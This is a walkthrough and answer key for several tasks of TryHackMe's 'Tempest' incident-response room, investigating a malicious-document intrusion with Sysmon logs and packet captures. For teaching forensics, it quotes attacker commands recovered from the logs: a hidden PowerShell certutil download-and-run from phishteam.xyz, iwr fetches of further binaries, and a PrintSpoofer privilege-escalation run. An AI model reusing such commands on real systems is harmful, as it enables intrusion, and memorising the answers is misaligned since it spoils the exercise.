## [Task 4 | Initial Access - Malicious Document](https://tryhackme.com/room/tempestincident?taskNo=4)

In this incident, you will act as an Incident Responder from an alert triaged by one of your Security Operations Center analysts. The analyst has confirmed that the alert has a CRITICAL severity that needs further investigation.

As reported by the SOC analyst, the intrusion started from a malicious document. In addition, the analyst compiled the essential information generated by the alert as listed below:

The malicious document has a .doc extension.
The user downloaded the malicious document via chrome.exe.
The malicious document then executed a chain of commands to attain code execution.

Use `powershell.exe` to run `PS C:\Tools\EvtxECmd> .\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv`, then open `TimelineExplorer.exe` and load this file.

## [Task 5 | Initial Access - Stage 2 Execution](https://tryhackme.com/room/tempestincident?taskNo=5)

Search for `update.zip` and inspect `Payload Data4` to find `TargetFilename:` **C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.zip**.

Because `Autostart` is a child process of `explorer.exe`, search for `benimaru explorer.exe`, then inspect the `Executable Info` column to find **"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni certutil -urlcache -split -f 'http[:]//phishteam[.]xyz/02dcf07/first[.]exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe**.

Search for `first.exe` then inspect the `Payload Data3` column to find `SHA256=`**CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8**.

### The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker? Format: domain:port

## [Task 6 | Initial Access - Malicious Document Traffic](https://tryhackme.com/room/tempestincident?taskNo=6)

### What is the URL of the malicious payload embedded in the document?

Load `capture.pcapng` into `Brim` then run the query `_path=="http" "phishteam.xyz" | sort ts` to find the `host`-`uri` combination **http[:]//phishteam[.]xyz/02dcf07/index[.]html**.

### What is the encoding used by the attacker on the c2 connection?

Load `capture.pcapng` into `WireShark` then run the query `ip.addr==167.71.222.162 && http` to find **Base64**-encoded requests. Note that this IP address was discovered for C2 in the previous task.

### The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?

Inspecting the `GET` request packets reveals a pattern like `GET /9ab62b5?q=...`, so the parameter being used is **q**. For example:

```bash
GET /9ab62b5?q=d2hvYW1pIC0gdGVtcGVzdFxiZW5pbWFydQ0K HTTP/1.1
Host: resolvecyber.xyz
Connection: Keep-Alive
user-agent: Nim httpclient/1.6.6
```

### The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?

This was also found in the previous question, being **/9ab62b5**.

### What is the HTTP method used by the binary?

This was also found in the previous question, being **GET**.

### Based on the user agent, what programming language was used by the attacker to compile the binary? Format: Answer in lowercase

This was also found in the previous question, being **nim**.

## [Task 8 | Privilege Escalation - Exploiting Privileges](https://tryhackme.com/room/tempestincident?taskNo=8)

### After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary? Format: binary name,SHA256 hash

Seeing that the reverse socks proxy connection was established on line 481, one may apply a filter for `Line >= 481 AND User Name = TEMPEST\benimaru`. Work through the results until line 870 to find in the `Executable Info` column `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" iwr http://phishteam.xyz/02dcf07/`**spf.exe**` -outfile spf.exe`. This is later executed on line 1922, which has in the `Payload Data3` column `SHA256=`**8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D**.

### Based on the SHA256 hash of the binary, what is the name of the tool used? Format: Answer in lowercase

Searching [VirusTotal](https://www.virustotal.com/gui/file/8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d) for this hash reveals the tool as **printspoofer**.

### The tool exploits a specific privilege owned by the user. What is the name of the privilege?

The public [GitHub](https://github.com/itm4n/PrintSpoofer) reveals that it uses **SeImpersonatePrivilege**.

### Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?

The next binary downloaded is `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" iwr http://phishteam.xyz/02dcf07/final.exe -outfile C:\ProgramData\final.exe` on line 1279, with execution on line 1922 as `"C:\Users\benimaru\Downloads\spf.exe" -c C:\ProgramData\`**final.exe**.

### The binary connects to a different port from the first c2 connection. What is the port used?

Ajust the filters to be `Line >= 481 AND User Name = NT AUTHORITY\SYSTEM AND Map Description = Network Connection` (the privilege has been escalated) and search for `final.exe` to find in the `Payload` column `{"@Name":"DestinationPort","#text":"8080"}`; port **8080**.
